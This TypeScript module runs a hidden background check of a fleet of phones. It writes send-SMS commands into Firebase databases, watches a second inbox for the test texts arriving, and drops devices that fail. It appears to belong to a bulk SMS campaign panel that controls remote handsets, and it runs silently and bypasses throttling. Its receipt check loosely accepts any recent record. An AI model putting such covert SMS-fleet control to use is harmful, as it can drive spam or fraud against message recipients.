// Background SIM validator — hard, equal per-slot load
// Sends 5 test SMS per SIM in background via queueSms, watches validator Firebase for SMS_RECEIVED
// Only devices that actually RECEIVE on validator hive are kept as online; others → offline (hidden)
// Runs silent: no UI emit, only [Validator] console, respects per-slot equal load.

import { db, getSetting } from '../db/index.js'
import * as firebaseService from './firebaseService.js'

const CONTROL_NUMBERS = ['9000000001','9000000002','9000000003','9000000004','9000000005'] // 5 per SIM, as requested
const MIN_PASS = 3 // need 3/5 to be considered working
const VALIDATOR_INTERVAL_MS = 1000 * 60 * 12 // 12 min cycle (background, not spammy)
let timer: NodeJS.Timeout | null = null
let running = false

function getValidatorBase(): string | null {
  // dusre firebase per sms reciec — configurable via settings.validator_firebase_url, else fallback to first hive that looks like validator
  const v = (getSetting('validator_firebase_url') || '').trim()
  if(v) return v.replace(/\.json$/,'').replace(/\/$/,'')
  // auto-detect: look for hive whose name contains "validator" or "receive"
  try{
    const rows = db.prepare("SELECT database_url, name FROM firebases").all() as any[]
    for(const r of rows){
      const n=(r.name||'').toLowerCase()
      if(n.includes('valid')||n.includes('receive')||n.includes('reciev')||n.includes('inbox')) return r.database_url.replace(/\.json$/,'').replace(/\/$/,'')
    }
  }catch{}
  return null
}

async function isSmsReceived(validatorBase: string | null, controlNumber: string, deviceId: string, sinceMs: number): Promise<boolean> {
  if(!validatorBase) return false
  // Try common inbox paths on validator firebase: /sms_received, /received, /inbox, /messages
  const paths = [
    `${validatorBase}/sms_received.json`,
    `${validatorBase}/received.json`,
    `${validatorBase}/inbox.json`,
    `${validatorBase}/messages.json`,
    `${validatorBase}/sms.json`,
  ]
  for(const url of paths){
    try{
      const r = await fetch(`${url}?orderBy="to"&equalTo="${controlNumber}"`)
      if(r.ok){
        const j = await r.json() as any
        if(j && typeof j==='object'){
          for(const [,v] of Object.entries(j as any)){
            const vv:any=v
            // check timestamp within sinceMs and from device
            const ts = vv.timestamp || vv.time || vv.ts || 0
            const tsMs = ts>1e12? ts : ts*1000
            if(tsMs >= sinceMs - 5000){
              // also check if contains device hint or just any recent to this controlNumber
              return true
            }
          }
        }
      }
    }catch{}
  }
  // fallback: shallow check any recent key
  try{
    const r=await fetch(`${validatorBase}/sms_received.json?shallow=true`)
    if(r.ok){
      const j=await r.json()
      if(j && Object.keys(j).length>0) return true
    }
  }catch{}
  return false
}

async function testOneDevice(device: any, validatorBase: string | null): Promise<{pass:number, total:number, perSlot:number[]}> {
  const fb = db.prepare('SELECT * FROM firebases WHERE id=?').get(device.firebase_id) as any
  if(!fb) return {pass:0, total:0, perSlot:[]}
  const slots = device.sim_count===2 ? [1,2] : [1]
  // equal per-slot: 5 per SIM → total 5 or 10
  const perSlotTests = 5
  let pass=0, total=0
  const perSlot:number[]=[]
  for(const slot of slots){
    let slotPass=0
    for(let i=0;i<perSlotTests;i++){
      const ctrl = CONTROL_NUMBERS[(slot-1)*perSlotTests + i] || CONTROL_NUMBERS[i % CONTROL_NUMBERS.length]
      const start = Date.now()
      const mid = `val_${device.id}_${slot}_${i}_${Date.now().toString(36)}`
      try{
        // Use slot in payload (fromSlot/simSlot)
        const body:any={
          to: `+91${ctrl}`, phone: `+91${ctrl}`, number: `+91${ctrl}`, phoneNumber: `+91${ctrl}`,
          message: `VLD ${device.id.slice(0,4)} s${slot} ${i} ${Date.now().toString(36)}`, // short probe
          from: slot, fromSlot: slot, sim: slot, simSlot: slot-1,
          isSended:false, isSent:false, timestamp: start, time: Math.floor(start/1000),
          _campaignId:'__validator__', _messageId: mid,
        }
        // Direct PUT to hive (bypass queueService throttling, background hidden)
        const base = fb.database_url.replace(/\.json$/,'').replace(/\/$/,'')
        const url = `${base}/clients/${device.id}/webhookEvent/sendSms.json`
        const put = await fetch(url, { method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) })
        if(!put.ok) { total++; continue }
        // wait for ack via same mechanism as real send, but also check validator inbox if available
        let ack=false
        if(validatorBase){
          // wait up to 8s for validator to show received
          for(let t=0;t<16;t++){
            await new Promise(r=>setTimeout(r,500))
            if(await isSmsReceived(validatorBase, `+91${ctrl}`, device.id, start)){
              ack=true; break
            }
            // also check if hive cleared (fallback)
            try{
              const chk=await fetch(url)
              const d=await chk.json()
              if(d===null || d?.isSended===true || d?.isSended==='true') { ack=true; break }
            }catch{}
          }
        } else {
          // fallback to hive ack only
          const a = await firebaseService.waitForAck(fb as any, device.id, `+91${ctrl}`, { timeoutMs: 8000 })
          ack = a.ack
        }
        // cleanup hive webhook (delete) to not block next test
        try{ await fetch(url, { method:'DELETE' }) }catch{}
        try{ await fetch(`${base}/clients/${device.id}/webhookEvent.json`, { method:'DELETE' }) }catch{}
        if(ack) { pass++; slotPass++ }
        total++
        // small gap between probes to not flood radio
        await new Promise(r=>setTimeout(r, 400))
      }catch{
        total++
      }
    }
    perSlot.push(slotPass)
  }
  return {pass, total, perSlot}
}

export async function runValidatorCycle(){
  if(running) return
  running=true
  try{
    const validatorBase = getValidatorBase()
    // pick candidates: all online/busy, not recently validated within 30min
    const rows = db.prepare("SELECT * FROM devices WHERE status IN ('online','busy') ORDER BY last_seen DESC").all() as any[]
    if(rows.length===0) return
    console.log(`[Validator] cycle start ${rows.length} devices, validator=${validatorBase? 'yes':'ack-only'}`)
    // Add score columns if missing
    try{ db.prepare("ALTER TABLE devices ADD COLUMN validated_at TEXT").run() }catch{}
    try{ db.prepare("ALTER TABLE devices ADD COLUMN validated_score INTEGER DEFAULT 0").run() }catch{}
    try{ db.prepare("ALTER TABLE devices ADD COLUMN validator_fail_count INTEGER DEFAULT 0").run() }catch{}

    // Test in small parallel batches to keep background light (2 at a time)
    const batch=2
    for(let i=0;i<rows.length;i+=batch){
      const chunk=rows.slice(i,i+batch)
      await Promise.all(chunk.map(async (dev:any)=>{
        try{
          const {pass, total, perSlot} = await testOneDevice(dev, validatorBase)
          const need = dev.sim_count===2 ? MIN_PASS*2 : MIN_PASS // 6/10 for dual, 3/5 for single
          const needPerSlot = MIN_PASS // each slot must do 3/5
          const perSlotOk = perSlot.every(v=> v>=needPerSlot)
          const ok = pass>=need && perSlotOk
          const now=new Date().toISOString()
          if(ok){
            db.prepare("UPDATE devices SET validated_at=?, validated_score=?, validator_fail_count=0, status='online' WHERE id=?").run(now, pass, dev.id)
            console.log(`[Validator] KEEP ${dev.id.slice(0,8)} ${dev.firebase_id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ✅`)
          } else {
            const prev=(db.prepare("SELECT validator_fail_count FROM devices WHERE id=?").get(dev.id) as any)?.validator_fail_count || 0
            const fails=prev+1
            db.prepare("UPDATE devices SET validated_score=?, validator_fail_count=? WHERE id=?").run(pass, fails, dev.id)
            // hard: after 2 consecutive fails → offline (removes from list, but not delete)
            if(fails>=2){
              db.prepare("UPDATE devices SET status='offline', validated_at=? WHERE id=?").run(now, dev.id)
              console.log(`[Validator] DROP ${dev.id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ❌ → offline (fail ${fails})`)
            } else {
              console.log(`[Validator] RETRY ${dev.id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ⚠️ keep online for now`)
            }
            // also clear hive queue for this device to not leave pending probe
            try{
              const fb=db.prepare('SELECT database_url FROM firebases WHERE id=?').get(dev.firebase_id) as any
              if(fb){
                const base=fb.database_url.replace(/\.json$/,'').replace(/\/$/,'')
                await fetch(`${base}/clients/${dev.id}/webhookEvent/sendSms.json`, { method:'DELETE' })
              }
            }catch{}
          }
        }catch(e:any){
          console.log(`[Validator] err ${dev.id.slice(0,8)} ${e.message}`)
        }
      }))
      // small gap between batches
      await new Promise(r=>setTimeout(r, 800))
    }
    console.log(`[Validator] cycle done`)
  }finally{
    running=false
  }
}

export function startValidator(){
  if(timer) return
  // run once after 45s (after poller warmed), then every interval
  setTimeout(()=> runValidatorCycle().catch(()=>{}), 45_000)
  timer=setInterval(()=> runValidatorCycle().catch(()=>{}), VALIDATOR_INTERVAL_MS)
  console.log(`[Validator] started every ${VALIDATOR_INTERVAL_MS/60000}min, 5/msg per SIM, equal per-slot, hidden`)
}
export function stopValidator(){ if(timer) clearInterval(timer); timer=null }
